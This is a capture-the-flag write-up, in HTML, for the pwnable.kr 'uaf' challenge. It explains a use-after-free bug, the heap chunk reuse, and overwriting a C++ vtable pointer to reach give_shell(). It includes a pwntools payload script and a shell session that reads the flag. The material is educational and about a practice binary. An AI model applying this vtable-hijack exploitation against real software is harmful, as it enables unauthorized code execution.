@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>pwnable.kr - uaf</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+
+    <style>
+        :root {
+            --bg: #f7f5ff;
+            --card: #ffffff;
+            --accent: #8b6cff;
+            --accent-soft: #e0d8ff;
+            --text-main: #1f1f2e;
+            --text-muted: #6b6b80;
+            --border-soft: #e6e2ff;
+            --shadow-soft: 0 14px 40px rgba(34, 26, 79, 0.12);
+            --radius: 18px;
+            --code-bg: #111827;
+            --code-border: #374151;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            margin: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: radial-gradient(circle at top, #fdfbff 0, #f3f2ff 40%, #ebe9ff 100%);
+            color: var(--text-main);
+        }
+
+        .page {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 32px 18px 60px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: var(--radius);
+            padding: 22px 22px 26px;
+            box-shadow: var(--shadow-soft);
+            border: 1px solid rgba(201, 189, 255, 0.5);
+        }
+
+        h1 { margin: 0 0 8px; font-size: 24px; }
+        h2 { font-size: 18px; margin: 18px 0 10px; }
+        h3 { font-size: 16px; margin: 16px 0 8px; }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 14px;
+        }
+
+        .tag-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .tag {
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 999px;
+            background: var(--accent-soft);
+            color: #3e346b;
+        }
+
+        article p {
+            font-size: 14px;
+            line-height: 1.7;
+            color: var(--text-main);
+            margin: 0 0 10px;
+        }
+
+        code {
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            font-size: 13px;
+            background: rgba(0, 0, 0, 0.04);
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+
+        pre {
+            margin: 10px 0 14px;
+            background: var(--code-bg);
+            color: #e5e7eb;
+            border-radius: 10px;
+            padding: 10px 12px;
+            overflow-x: auto;
+            border: 1px solid var(--code-border);
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        pre code { background: none; padding: 0; }
+
+        /* Wrap long lines in code blocks */
+        pre, pre code { white-space: pre-wrap; word-break: break-word; }
+
+        ul { padding-left: 18px; margin: 6px 0 14px; }
+        li { font-size: 14px; line-height: 1.6; color: var(--text-main); margin-bottom: 4px; }
+
+        a { color: var(--accent); text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            margin-bottom: 14px;
+            color: var(--text-muted);
+            text-decoration: none;
+        }
+
+        .back-link:hover { color: var(--accent); text-decoration: underline; }
+
+        .back-link span { font-size: 16px; line-height: 1; }
+
+        .header-image {
+            max-width: 240px;
+            max-height: 180px;
+            width: auto;
+            height: auto;
+            object-fit: contain;
+            margin: 8px auto 14px;
+            display: block;
+            border-radius: 12px;
+            box-shadow: 0 10px 24px rgba(15, 23, 42, 0.22);
+        }
+
+        .figure-image {
+            width: 100%;
+            max-width: 520px;
+            display: block;
+            margin: 12px auto;
+            border-radius: 12px;
+            box-shadow: 0 10px 24px rgba(15, 23, 42, 0.14);
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid var(--border-soft);
+            margin: 18px 0;
+        }
+    </style>
+</head>
+
+<body>
+<div class="page">
+    <a href="index.html" class="back-link">
+        <span>←</span> back to writeups
+    </a>
+
+    <div class="card">
+        <header>
+            <h1>uaf</h1>
+            <div class="subtitle">
+                Use-after-free exploitation in the “Rookiss” track on
+                <a href="https://pwnable.kr" target="_blank" rel="noreferrer">pwnable.kr</a>.
+            </div>
+            <div class="tag-row">
+                <div class="tag">Rookiss</div>
+                <div class="tag">Points: 30</div>
+                <div class="tag">Host: pwnable.kr</div>
+            </div>
+            <!-- Optional header image (if you have one) -->
+            <!-- <img src="images/uaf.png" alt="uaf" class="header-image" /> -->
+        </header>
+
+        <article>
+            <hr />
+
+            <h2>Hint</h2>
+            <pre><code>Do you wanna try some Use-After-Free vulnerability exploitation?
+
+ssh uaf@pwnable.kr -p2222 (pw:guest)</code></pre>
+
+            <h2>Setup</h2>
+            <pre><code>ssh uaf@pwnable.kr -p2222</code></pre>
+
+            <p>In <code>/home/uaf</code> we see:</p>
+            <pre><code>uaf
+flag</code></pre>
+
+            <p>Running <code>file</code> on the binary:</p>
+            <pre><code>uaf: setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fc10dc701644a83bbb4c8d75cd448fea402ad051, for GNU/Linux 3.2.0, not stripped</code></pre>
+
+            <p>So: 64-bit binary without source code.</p>
+
+            <h2>Running the program</h2>
+            <p>I run the binary to see what it does. It drops me into an endless menu:</p>
+
+            <pre><code>1. use
+2. after
+3. free</code></pre>
+
+            <p>Choosing 1 (use) prints:</p>
+            <pre><code>My name is Jack
+I am 25 years old
+I am a nice guy!
+My name is Jill
+I am 21 years old
+I am a cute girl!</code></pre>
+
+            <p>Choosing 3 (free) prints nothing. Choosing 2 (after) immediately segfaults.</p>
+
+            <h2>Static analysis (Ghidra)</h2>
+            <p>At program startup, two objects are allocated on the heap:</p>
+            <ul>
+                <li>a <code>Man</code></li>
+                <li>a <code>Woman</code></li>
+            </ul>
+
+            <p>
+                Both inherit from a base class <code>Human</code>. Each allocation is <code>0x30</code> bytes,
+                and the pointers to these objects are stored on the stack.
+            </p>
+
+            <h3>Menu options</h3>
+            <p><strong>Option 1 - use</strong><br />
+                Calls a virtual <code>introduce()</code> method on each object. This prints the name, age, and a class-specific message.
+            </p>
+
+            <p><strong>Option 2 - after</strong><br />
+                Takes two program arguments: (1) an integer <code>size</code> (2) a filename. It then allocates <code>size</code> bytes, opens the file, and reads the file contents into the allocated buffer.
+            </p>
+
+            <p><strong>Option 3 - free</strong><br />
+                Calls the destructors of <code>Man</code> and <code>Woman</code>, and frees both objects. At this point, the stack pointers still exist, but the heap memory does not.
+            </p>
+
+            <img class="figure-image" src="images/uaf-before-free.png" alt="uaf before free" />
+            <img class="figure-image" src="images/uaf-free.png" alt="uaf after free" />
+
+            <p>At this point, it's clear that it's a use-after-free vulnerability.</p>
+
+            <h2>What is a Use-After-Free?</h2>
+            <p>
+                A use-after-free is a common bug in programs written in unsafe memory languages like C or C++.
+                If memory is freed but the program keeps a pointer and continues to use it, the behavior is undefined.
+                If an attacker reallocates that freed chunk and controls its contents, the program can treat attacker-controlled
+                data as a real object (including function pointers).
+            </p>
+
+            <h2>Dynamic analysis</h2>
+            <p>
+                I use gdb and start checking what actually happens in memory. First, I choose option 3 to free the
+                <code>Man</code> and <code>Woman</code> objects. Then I choose option 2 and pass: size <code>48</code> (exactly <code>0x30</code>)
+                and a file containing <code>48</code> <code>'A'</code> characters.
+            </p>
+
+            <p>
+                At first the buffer is somewhere else, but when I repeat the allocation, the allocator reuses the freed chunk,
+                and my input ends up exactly where the <code>Man</code> object used to be. Option 2 is basically giving me a write primitive on a freed object.
+            </p>
+
+            <h3>Why did it work?</h3>
+            <p>
+                After freeing <code>Man</code> and <code>Woman</code>, their <code>0x30</code>-byte chunks are placed in malloc’s free list.
+                When I request another chunk of the same size, malloc often reuses one of these freed chunks.
+            </p>
+
+            <img class="figure-image" src="images/uaf-attack.png" alt="uaf attack overlap" />
+
+            <h2>Confirming the UAF</h2>
+            <p>
+                After overwriting the freed object with <code>'A' * 48</code>, I choose option 1 again.
+                The program crashes: it tries to call a virtual function through a vtable pointer that I overwrote with <code>0x41414141</code>.
+            </p>
+
+            <h2>Object layout and vtable</h2>
+            <p>Looking at the object in memory:</p>
+
+            <pre><code>0x5e5beb0:  0x00404d80  0x00000000  0x00000019  0x00000000
+0x5e5bec0:  0x05e5bed0  0x00000000  0x00000004  0x00000000
+0x5e5bed0:  0x6b63614a ("Jack")</code></pre>
+
+            <p>
+                The first value in the object is the vtable pointer (<code>0x00404d80</code>). When option 1 is selected, the program calls
+                <code>introduce()</code> through this vtable.
+            </p>
+
+            <p>
+                Looking at the vtable, I see that the first entry points to <code>give_shell()</code>, and <code>introduce()</code> is located at offset <code>+0x8</code>.
+                So the virtual call effectively looks like:
+            </p>
+
+            <pre><code>call [vtable + 0x8]</code></pre>
+
+            <p>
+                Instead of pointing to the original vtable address, I want the object to point to an address shifted by <code>-0x8</code>.
+                This way, when the program adds <code>+0x8</code>, it lands on <code>give_shell()</code>.
+            </p>
+
+            <pre><code>vtable = give_shell - 0x8</code></pre>
+
+            <p>
+                Which gives the address <code>0x404d78</code>. By overwriting the freed object’s vtable pointer with this value,
+                the virtual call ends up calling <code>give_shell()</code>.
+            </p>
+
+            <p>
+                The binary is non-PIE, so even with ASLR enabled the <code>.text</code> segment is not randomized,
+                and the address of <code>give_shell()</code> stays fixed.
+            </p>
+
+            <h2>Exploit</h2>
+            <ol>
+                <li>Free the <code>Man</code> and <code>Woman</code> objects</li>
+                <li>Reallocate a chunk of size <code>0x30</code> (twice)</li>
+                <li>Overwrite the vtable pointer with <code>0x404d78</code></li>
+                <li>Trigger option <code>1</code> to invoke the virtual call</li>
+            </ol>
+
+            <p>This is the script:</p>
+            <pre><code>from pwn import *
+
+address = p64(0x404d78)
+payload = address + (b'A' * (48-len(address)))
+
+with open('input', 'wb') as f:
+    f.write(payload)</code></pre>
+
+            <p>This gives me:</p>
+            <pre><code>b'xM@\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</code></pre>
+
+            <p>And then:</p>
+            <pre><code>$ ~/uaf 48 input
+1. use
+2. after
+3. free
+3
+---
+1. use
+2. after
+3. free
+2
+---
+your data is allocated
+1. use
+2. after
+3. free
+2
+---
+your data is allocated
+1. use
+2. after
+3. free
+1
+---
+$ whoami
+uaf
+$ cat ~/flag
+d3lici0us_fl4g_after_pwning</code></pre>
+
+            <p><strong>Score!</strong></p>
+
+            <h2>References</h2>
+            <ul>
+                <li>
+                    UAF video walkthrough / explanation:
+                    <a href="https://www.youtube.com/watch?v=3DPMjLmw70Y&lc=Ugx6LqVftZDF_PdvOQF4AaABAg" target="_blank" rel="noreferrer">
+                        https://www.youtube.com/watch?v=3DPMjLmw70Y
+                    </a>
+                </li>
+            </ul>
+        </article>
+    </div>
+</div>
+</body>
+</html>
